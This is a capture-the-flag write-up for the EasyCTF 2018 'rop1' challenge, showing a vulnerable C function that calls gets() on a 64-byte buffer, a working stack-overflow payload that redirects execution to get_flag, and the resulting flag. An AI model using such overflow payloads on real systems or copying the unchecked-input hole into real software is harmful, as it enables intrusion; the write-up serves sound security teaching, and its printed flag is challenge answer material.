# EasyCTF_2018: rop1

**Category:** Binary Exploitation
**Points:** 120
**Description:**

>Go to `/problems/rop1` on the shell server and tell me whats in `flag.txt`.

## Write-up
We are given two relevant files, [rop1](rop1) and [rop1.c](rop1.c). This is also relatively easy, just get the address of the function,

    0x00400646    1 17           sym.get_flag

and the buffer size, 

    void get_input()
    {
        char inp[64];
        gets(inp);
        printf("You said: %s\n", inp);
    }

Add `8` to it, and prepare your payload,

    $ python -c "print('A' * 72 + '\x46\x06\x40\x00')" | ./rop1
    You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF@
    easyctf{r0ps_and_h0ps}
    Segmentation fault (core dumped)

Therefore, the flag is `easyctf{r0ps_and_h0ps}`.
